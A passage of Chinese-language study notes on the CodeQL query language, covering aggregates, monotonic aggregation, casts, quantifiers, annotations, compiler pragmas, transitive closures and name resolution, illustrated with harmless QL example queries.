</p><p><code>&lt;expression&gt;</code> 必须是数字类型或者string类型</p><p>聚合返回所有js文件中文件行数最多的文件名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max(File f | f.getExtension() &#x3D; &quot;js&quot; | f.getBaseName() order by f.getTotalNumberOfLines(), f.getNumberOfLinesOfCode())</span><br></pre></td></tr></table></figure></li><li><p><strong>avg</strong>：  <code>&lt;expression&gt;</code> 的平均值 </p><p><code>&lt;expression&gt;</code>结果必须的是数值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">avg(int i | i &#x3D;[0..3]|i) &#x2F;&#x2F; 0，1，2，3的平均值</span><br></pre></td></tr></table></figure></li><li><p><strong>sum</strong>：<code>&lt;expression&gt;</code> 的总和</p><p><code>&lt;expression&gt;</code>结果必须的是数值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sum(int i, int j| i in [0..2] and j in [3..5]| i*j)</span><br></pre></td></tr></table></figure></li><li><p><strong>concat</strong>：将<code>&lt;expression&gt;</code>的各种结果都聚合到一起。</p><p><code>&lt;expression&gt;</code>结果必须是string。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(int i| i in [0..3] | i.toString() order by i desc) &#x2F;&#x2F; 3210</span><br><span class="line">select concat(int i| i in [0..3] | i.toString(),&quot;|&quot; order by i desc) &#x2F;&#x2F; 3|2|1|0</span><br></pre></td></tr></table></figure></li><li><p><strong>rank</strong></p><p>给<code>&lt;expression&gt;</code>的结果排序。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rank[4](int i | i &#x3D; [1..10] | i) &#x2F;&#x2F; 4</span><br><span class="line">select rank[4](int i | i &#x3D; [1 .. 10] | i order by i desc) &#x2F;&#x2F; 7</span><br></pre></td></tr></table></figure><blockquote><p>[index]从1开始，rank[0] has no result</p><p>rank[1] == min(…)</p></blockquote></li><li><p><strong>strictconcat</strong>，<strong>strictcount</strong>，<strong>strictsum</strong></p><p>没有满足formula的，就返回empty set，而不是默认的0或者空字符串</p></li><li><p><strong>unique</strong></p><p>返回<code>&lt;expression&gt;</code>的结果集中满足formula的唯一值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from int x</span><br><span class="line">where x in [-5 .. 5] and x !&#x3D; 0</span><br><span class="line">select unique(int y | y &#x3D; x or y &#x3D; x.abs() | y)</span><br></pre></td></tr></table></figure><p>[1..5]满足的x和x.abs()的结果是唯一的</p></li></ol><h4 id="单调聚合"><a href="#单调聚合" class="headerlink" title="单调聚合"></a>单调聚合</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">string getPerson() &#123; result &#x3D; &quot;Alice&quot; or</span><br><span class="line">                     result &#x3D; &quot;Bob&quot; or</span><br><span class="line">                     result &#x3D; &quot;Charles&quot; or</span><br><span class="line">                     result &#x3D; &quot;Diane&quot;</span><br><span class="line">                   &#125;</span><br><span class="line">string getFruit(string p) &#123; p &#x3D; &quot;Alice&quot;   and result &#x3D; &quot;Orange&quot; or</span><br><span class="line">                            p &#x3D; &quot;Alice&quot;   and result &#x3D; &quot;Apple&quot; or</span><br><span class="line">                            p &#x3D; &quot;Bob&quot;     and result &#x3D; &quot;Apple&quot; or</span><br><span class="line">                            p &#x3D; &quot;Charles&quot; and result &#x3D; &quot;Apple&quot; or</span><br><span class="line">                            p &#x3D; &quot;Charles&quot; and result &#x3D; &quot;Banana&quot;</span><br><span class="line">                          &#125;</span><br><span class="line">int getPrice(string f) &#123; f &#x3D; &quot;Apple&quot;  and result &#x3D; 100 or</span><br><span class="line">                         f &#x3D; &quot;Orange&quot; and result &#x3D; 100 or</span><br><span class="line">                         f &#x3D; &quot;Orange&quot; and result &#x3D;   1</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">predicate nonmono(string p, int cost) &#123;</span><br><span class="line">  p &#x3D; getPerson() and cost &#x3D; sum(string f | f &#x3D; getFruit(p) | getPrice(f))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">language[monotonicAggregates]</span><br><span class="line">predicate mono(string p, int cost) &#123;</span><br><span class="line">  p &#x3D; getPerson() and cost &#x3D; sum(string f | f &#x3D; getFruit(p) | getPrice(f))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from string variant, string person, int cost</span><br><span class="line">where variant &#x3D; &quot;default&quot;  and nonmono(person, cost) or</span><br><span class="line">      variant &#x3D; &quot;monotonic&quot; and mono(person, cost)</span><br><span class="line">select variant, person, cost</span><br><span class="line">order by variant, person</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/image-20211028120610724.png" alt="image-20211028120610724" style="zoom:50%;"><p>一种苹果，两种橙子</p><p>区别：</p><ol><li>非单调谓词：Alice买了苹果和橙子，sum会把这些一起求和100+100+1=201</li><li>单调谓词：Alice会分别计算100+1=101，100+100=200</li></ol><p>Charies想买苹果+香蕉，但是香蕉根本不卖</p><p>非单调谓词：直接返回苹果+0</p><p>单词谓词：因为香蕉的值没有，所以直接不算</p><p>Diane什么都不买，所以都显示0。但如果用strictsum，两种谓词都不显示</p><p>单调谓词普遍用于递归，因为每一轮结果都是有意义(fix-point)。</p><h4 id="递归单调聚合"><a href="#递归单调聚合" class="headerlink" title="递归单调聚合"></a>递归单调聚合</h4><p>单调聚合函数经常用来<strong>递归</strong>，这种递归通常应用在表达式中。</p><p>举例：计算当前节点到叶子结点的距离：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int depth(Node n) &#123;</span><br><span class="line">  if not exists(n.getAChild())</span><br><span class="line">  then result &#x3D; 0</span><br><span class="line">  else result &#x3D; 1 + max(Node child | child &#x3D; n.getAChild() | depth(child))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Any"><a href="#Any" class="headerlink" title="Any"></a>Any</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">any(&lt;variable declarations&gt; | &lt;formula&gt; | &lt;expression&gt;)</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/image-20211028173634119.png" alt="image-20211028173634119" style="zoom:50%;"><h3 id="Cast-类型强转"><a href="#Cast-类型强转" class="headerlink" title="Cast 类型强转"></a>Cast 类型强转</h3><p>两种方式：</p><ul><li>postfix 后缀，<code>x.(Foo)</code> 表示将x限制为Foo类型</li><li>prefix 前缀，<code>(Foo)x</code> 也表示将x限制为Foo类型</li></ul><p>一般用法：x.(Foo) 等同于((Foo)x)</p><p>例子：查找父类是List的类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Type t</span><br><span class="line">where t.(Class).getASupertype().hasName(&quot;List&quot;)</span><br><span class="line">select t</span><br></pre></td></tr></table></figure><h3 id="无关表达式-Don’t-care-expression"><a href="#无关表达式-Don’t-care-expression" class="headerlink" title="无关表达式 Don’t-care expression"></a>无关表达式 Don’t-care expression</h3><p>参数单个下划线表示，表示any value，不关心实际是什么</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from string s</span><br><span class="line">where s &#x3D; &quot;hello&quot;.charAt(_)</span><br><span class="line">select s</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;l,o,e,h</span><br></pre></td></tr></table></figure><h2 id="公式-Formula"><a href="#公式-Formula" class="headerlink" title="公式 Formula"></a>公式 Formula</h2><p>Formulas define logical relations between the free variables used in expressions.</p><p>Formula限制了表达式中那些free类型的变量。</p><p>当一个formula为true，习惯说是hold住了</p><p>hold：</p><p>“Ann” &lt; “Anne”</p><p>[1 .. 2] = [2 .. 5]</p><h3 id="Type-check"><a href="#Type-check" class="headerlink" title="Type check"></a>Type check</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;expression&gt; instanceof &lt;type&gt;</span><br></pre></td></tr></table></figure><h3 id="range-check"><a href="#range-check" class="headerlink" title="range check"></a>range check</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;expression&gt; in &lt;type&gt;</span><br><span class="line">&lt;expression&gt; &#x3D; &lt;type&gt;</span><br></pre></td></tr></table></figure><p>两种形式表达都可以</p><h3 id="量化公式"><a href="#量化公式" class="headerlink" title="量化公式"></a>量化公式</h3><h4 id="显式量词"><a href="#显式量词" class="headerlink" title="显式量词"></a>显式量词</h4><p><strong>exists</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exists(&lt;variable declarations&gt; | &lt;formula1&gt; and &lt;formula2&gt;)</span><br></pre></td></tr></table></figure><p><strong>forall</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forall(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure><p>hold formula1的全部变量也能够hold formula2 那么整个formula就hold</p><p><strong>forex</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forex(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure><p>等同于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">forall(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;) and</span><br><span class="line">exists(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure><h4 id="隐式量词"><a href="#隐式量词" class="headerlink" title="隐式量词"></a>隐式量词</h4><p>Don’t-care expression</p><h4 id="逻辑连接词"><a href="#逻辑连接词" class="headerlink" title="逻辑连接词"></a>逻辑连接词</h4><p>比如：</p><ul><li>not</li><li>if…then…else</li><li>and</li><li>or</li><li>implies</li></ul><p>重点说一下implies</p><p>A implies B 表示的是 (not A) or B</p><p>举例子：找到[1..10]之内 是奇数 或者 是4的倍数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class SmallInt extends int&#123;</span><br><span class="line">SmallInt()&#123; this in [1..10]&#125;</span><br><span class="line">&#125;</span><br><span class="line">from SmallInt x</span><br><span class="line">where x % 2 &#x3D; 0 implies x % 4 &#x3D; 0</span><br><span class="line">select x</span><br></pre></td></tr></table></figure><h2 id="注解-Annotation"><a href="#注解-Annotation" class="headerlink" title="注解 Annotation"></a>注解 Annotation</h2><p>注释是一个字符串，可以直接放在 QL 实体或名称的声明之前。</p><p>私有类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private module M &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一些注解可以作用于实体，另一些作用于实体的特定名称</p><p>作用于实体：</p><ul><li><code>abstract</code>, <code>cached</code>, <code>external</code>, <code>transient</code>, <code>final</code>, <code>override</code>, <code>pragma</code>, <code>language</code>, and <code>bindingset</code></li></ul><p>作用于名称：</p><ul><li><code>deprecated</code>, <code>library</code>, <code>private</code>, and <code>query</code></li></ul><h4 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h4><p><strong>Available for</strong>:  classes  ， member predicates  可用于：类， 成员谓词</p><p><strong>抽象谓词 abstract predicate</strong></p><p>have no body，一定要被子类去overirde</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abstract class Configuration extends string &#123;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;** Holds if &#96;source&#96; is a relevant data flow source. *&#x2F;</span><br><span class="line">  abstract predicate isSource(Node source);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义数据流分析，之后可以对不同的case，实现不同的子类override多种的isSource</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class ConfigA extends Configuration &#123;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; provides a concrete definition of &#96;isSource&#96;</span><br><span class="line">  override predicate isSource(Node source) &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line">class ConfigB extends ConfigA &#123;</span><br><span class="line">  ...</span><br><span class="line">  &#x2F;&#x2F; doesn&#39;t need to override &#96;isSource&#96;, because it inherits it from ConfigA</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="cached"><a href="#cached" class="headerlink" title="cached"></a>cached</h4><p><strong>Avilable for</strong>：class , algebraic datatypes , 特征谓词，成员谓词，非成员谓词， 模块</p><p>不怎么用 没细看。保存select到缓存中。</p><h4 id="deprecated"><a href="#deprecated" class="headerlink" title="deprecated"></a>deprecated</h4><p><strong>Avilable for</strong>：class , algebraic datatypes , 成员谓词，非成员谓词， 类成员，模块，别名</p><p>表示过时，不建议使用的版本。</p><h4 id="external"><a href="#external" class="headerlink" title="external"></a>external</h4><p><strong>Avilable for</strong>：非成员谓词</p><p>外部模板谓词，常用于数据库谓词</p><h4 id="trainsient"><a href="#trainsient" class="headerlink" title="trainsient"></a>trainsient</h4><p><strong>Avilable for</strong>：非成员谓词</p><p>查询不会持久化存储在磁盘上</p><h4 id="final"><a href="#final" class="headerlink" title="final"></a>final</h4><p><strong>Avilable for</strong>：类，成员谓词，类成员</p><p>表示被修饰的不可以被重写或者继承，final类不可以被任何类继承。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Element ... &#123;</span><br><span class="line">  string getName() &#123; result &#x3D; ... &#125;</span><br><span class="line">  final predicate hasName(string name) &#123; name &#x3D; this.getName() &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="override"><a href="#override" class="headerlink" title="override"></a>override</h4><p><strong>Avilable for</strong>：成员谓词，类成员</p><h4 id="private"><a href="#private" class="headerlink" title="private"></a>private</h4><p><strong>Avilable for</strong>：类，代数类型，成员谓词，非成员谓词，import，类成员，模块，别名</p><h4 id="query"><a href="#query" class="headerlink" title="query"></a>query</h4><p><strong>Avilable for</strong>：非成员谓词，别名</p><p>将一个谓词转换为查询</p><h3 id="编译器参数"><a href="#编译器参数" class="headerlink" title="编译器参数"></a>编译器参数</h3><p>优化执行性能。</p><p><strong>Inling 内联</strong></p><p>对于简单的谓词，QL优化器有时会用谓词体本身取代对谓词的调用，这就是所谓的内联。</p><p>例如，假设你有一个定义谓词one(int i) { i = 1 }和一个对该谓词的调用…one(y) …. QL优化器可以将该谓词内联为…y = 1 ….</p><p>你可以使用以下编译器pragma注释来控制QL优化器内联谓词的方式。</p><p><strong>pragma[inline]</strong></p><p>告诉QL优化器将这个谓词内联到它被调用的地方。当一个谓词体完全计算起来非常昂贵时，这可能很有用，因为它可以确保谓词在被调用的地方与其他上下文信息一起被评估。</p><p><strong>pragma[noinline]</strong></p><p>用于防止一个谓词被内联到它被调用的地方。在实践中，当你已经在一个 “辅助 “谓词中把某些变量组合在一起时，这个注解是有用的，以确保关系被整体评估。这可以帮助提高性能。QL优化器的内联可能会撤销辅助谓词的工作，所以用pragma[noinline]来注释它是个好主意。</p><p><strong>pragma[nomagic]</strong></p><p>用于防止QL优化器在谓词上执行 “魔法集 “优化。</p><p>这种优化包括从谓词调用的上下文中获取信息并将其推入谓词的主体。这通常是有益的，所以你<strong>不应该使用pragma[nomagic]注解，除非GitHub推荐这样做</strong>。</p><p>请注意，nomagic也就意味着noinline。</p><p><strong>pragma[noopt]</strong></p><p>用于阻止QL优化器对谓词进行优化，除非它对编译和评估的工作绝对必要。</p><p><strong>这很少有必要，你不应该使用pragma[noopt]注解，除非GitHub推荐这样做</strong>，例如，为了帮助解决性能问题。</p><p><strong>pragma[only_bind_out]</strong></p><p>可以让你指定QL编译器应该绑定表达式的方向。这对于在QL优化器以低效方式排列QL程序的部分的罕见情况下提高性能是很有用的。</p><p>例如，<code>x = pragma[only_bind_out](y)</code>在语义上等同于x = y，但有不同的绑定行为。x = y从y绑定x，反之亦然，而<code>x = pragma[only_bind_out](y)</code>只从y绑定x。</p><p>欲了解更多信息，请参见 “<a href="https://codeql.github.com/docs/ql-language-reference/evaluation-of-ql-programs/#binding" target="_blank" rel="noopener">Binding</a>“。</p><p><strong>pragma[only_bind_into]</strong></p><p>指定QL编译器应该绑定表达式的方向。这对于在QL优化器以低效率的方式排列QL程序的部分的罕见情况下提高性能是很有用的。</p><p>例如，<code>x = pragma[only_bind_into](y)</code>在语义上等同于x = y，但有不同的绑定行为。x = y从y绑定x，反之亦然，而<code>x = pragma[only_bind_into</code>](y)只从x绑定y。</p><p>欲了解更多信息，请参见 “<a href="https://codeql.github.com/docs/ql-language-reference/evaluation-of-ql-programs/#binding" target="_blank" rel="noopener">Binding</a>“。</p><p><strong>bindingset[…]</strong></p><p><a href="https://codeql.github.com/docs/ql-language-reference/predicates/#binding-behavior" target="_blank" rel="noopener">https://codeql.github.com/docs/ql-language-reference/predicates/#binding-behavior</a></p><p>明确说明谓词或类的绑定集。绑定集是谓词或类主体的参数的一个子集，如果这些参数被限制在一个有限的值集上，那么谓词或类本身就是有限的（也就是说，它被评估为一个有限的图元集）。</p><p>bindingset 注解接受一个用逗号分隔的变量列表。</p><p>当您注释一个谓词时，每个变量必须是谓词的参数，可能包括this（对于特征谓词和成员谓词）和result（对于返回结果的谓词）。<br>当你注解一个类时，每个变量必须是this或该类中的一个字段。从CodeQL CLI的2.3.0版和LGTM Enterprise的1.26版开始支持类的绑定集。</p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><h3 id="传递闭包-Transitive-closures"><a href="#传递闭包-Transitive-closures" class="headerlink" title="传递闭包 Transitive closures"></a>传递闭包 Transitive closures</h3><p>原始谓词必须要有两个参数，this 和 result， 参数类型必须兼容</p><h4 id="传递闭包"><a href="#传递闭包" class="headerlink" title="传递闭包 +"></a>传递闭包 +</h4><p>一次或者多次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Person getAnAncestor() &#123;</span><br><span class="line">  result &#x3D; this.getAParent()</span><br><span class="line">  or</span><br><span class="line">  result &#x3D; this.getAParent().getAnAncestor()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">等价于getparent+() 返回p的所有祖先（不包含p）</span><br></pre></td></tr></table></figure><h4 id="自反传递闭包"><a href="#自反传递闭包" class="headerlink" title="自反传递闭包 *"></a>自反传递闭包 *</h4><p>0次或者多次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Person getAnAncestor2() &#123;</span><br><span class="line">  result &#x3D; this</span><br><span class="line">  or</span><br><span class="line">  result &#x3D; this.getAParent().getAnAncestor2()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">等价于getAParent*() 返回p的所有祖先（包含p）</span><br></pre></td></tr></table></figure><h2 id="名称解析-Name-resolution"><a href="#名称解析-Name-resolution" class="headerlink" title="名称解析 Name resolution"></a>名称解析 Name resolution</h2><p>QL将名称解析为程序元素。</p><h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import javascript</span><br></pre></td></tr></table></figure><h3 id="标准化引用"><a href="#标准化引用" class="headerlink" title="标准化引用"></a>标准化引用</h3><p>模块表达使用<code>.</code>来 导入相对路径下的其他module</p><p>举例<code>Example.ql</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import examples.security.MyLibrary</span><br></pre></td></tr></table></figure><p>QL如何寻找：</p><ol><li>首先将所有的<code>.</code>替换为当前操作系统的文件分割符，所以QL首先在<code>Example.ql</code>文件目录下寻找<code>examples/security/MyLibrary.qll</code>文件，找到了就import。</li><li>如果没找到，QL会去包含<code>qlpack.yml</code>文件的目录下寻找<code>examples/security/MyLibrary.qll</code>文件。</li><li>如果还没找到，那么就去每个库目录下进行寻找，库目录就是<code>qlpack.yml</code>定义的<code>libraryPathDependencies</code>属性的值。</li></ol><h3 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h3><p>可以使用选择来引用特定模块内的模块、类、或谓词。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;module_expression&gt;::&lt;name&gt;</span><br></pre></td></tr></table></figure><p>举例：</p><p><strong>libs/CountriesLib.qll</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Countries extends string &#123;</span><br><span class="line">  Countries() &#123;</span><br><span class="line">    this &#x3D; &quot;Belgium&quot;</span><br><span class="line">    or</span><br><span class="line">    this &#x3D; &quot;France&quot;</span><br><span class="line">    or</span><br><span class="line">    this &#x3D; &quot;India&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module M&#123;</span><br><span class="line">    class EuropeanCountries extends Countries &#123;</span><br><span class="line">        EuropeanCountries()&#123;</span><br><span class="line">            this &#x3D; &quot;Belgium&quot;</span><br><span class="line">            or</span><br><span class="line">            this &#x3D; &quot;France&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="../images/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/image-20211028224602517.png" alt="image-20211028224602517" style="zoom:50%;"><p>CustomModule.ql：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import libs.CountriesLib &#x2F;&#x2F; qll文件名</span><br><span class="line"></span><br><span class="line">from M::EuropeanCountries ec &#x2F;&#x2F; qll文件中的模块自然就被引用了，可以直接选择M</span><br><span class="line">select ec</span><br></pre></td></tr></table></figure><p>第二种：只导入M模块中的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import libs.CountriesLib::M</span><br><span class="line"></span><br><span class="line">from EuropeanCountries ec</span><br><span class="line">select ec</span><br></pre></td></tr></table></figure><h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>实体：module type predicate</p><h4 id="global-namespace"><a href="#global-namespace" class="headerlink" title="global namespace"></a>global namespace</h4><p>包含所有内置实体的区域都叫做global namespace</p><p>QL自动引入，直接使用关键字就行，不用import任何东西</p><h4 id="local-namespace"><a href="#local-namespace" class="headerlink" title="local namespace"></a>local namespace</h4><p>对于之前提到的M来说，主要分为三种：</p><ol><li><strong>declared</strong>：M模块中声明的任何内容</li><li><strong>imported</strong>：谁import了M模块，那么自动也会import M模块中的import</li><li><strong>exported</strong>：</li></ol><p>举例：<strong>OneTwoThreeLib.qll</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import MyFavoriteNumbers</span><br><span class="line"></span><br><span class="line">class OneTwoThree extends int &#123;</span><br><span class="line">  OneTwoThree() &#123;</span><br><span class="line">    this &#x3D; 1 or this &#x3D; 2 or this &#x3D; 3</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private module P &#123;</span><br><span class="line">  class OneTwo extends OneTwoThree &#123;</span><br><span class="line">    OneTwo() &#123;</span><br><span class="line">      this &#x3D; 1 or this &#x3D; 2</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MyFavoriteNumbers内部import的任何东西都被当前OneTwoThreeLib.qll <strong>import</strong>了</p><p>OneTwoThreeLib <strong>declare</strong>了两个成分：class OneTwoThree 和 private module  P</p><p>OneTwoThreeLib <strong>export</strong>了class OneTwoThree 以及任何在MyFavoriteNumbers export内容</p><p>由于module P 是private修饰的 所以不可以被export</p><h2 id="QL程序的演变-evolution"><a href="#QL程序的演变-evolution" class="headerlink" title="QL程序的演变 evolution"></a>QL程序的演变 evolution</h2><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>当 QL 程序对数据库查询时，它会被编译成逻辑编程语言<a href="https://en.wikipedia.org/wiki/Datalog" target="_blank" rel="noopener">Datalog</a>的<strong>变体格式</strong>。这种格式针对性能进行了优化，然后进行了评估以产生结果。</p><p>QL的查询结果都是元组<strong>tuple</strong></p><h2 id="QL语言规范"><a href="#QL语言规范" class="headerlink" title="QL语言规范"></a>QL语言规范</h2><p>太多了，挑一些重点</p><h3 id="Types"><a href="#Types" class="headerlink" title="Types"></a>Types</h3><p>QL中的type包括：</p><p>基础类型（5种）、数据库类型、类类型、字符类型、类域（class domain）类型</p><blockquote><p>Types in QL are either <em>primitive</em> types, <em>database</em> types, <em>class</em> types, <em>character</em> types or <em>class domain</em> types.</p></blockquote><blockquote><p>Within the specification the class type for C is written C.class, the character type is written C.C and the domain type is written C.extends. However the class type is still named C.</p></blockquote><h3 id="Value"><a href="#Value" class="headerlink" title="Value"></a>Value</h3><p>5种基础类型 int  float string boolean date + 1种 entity</p><h3 id="Key-Words"><a href="#Key-Words" class="headerlink" title="Key Words"></a>Key Words</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 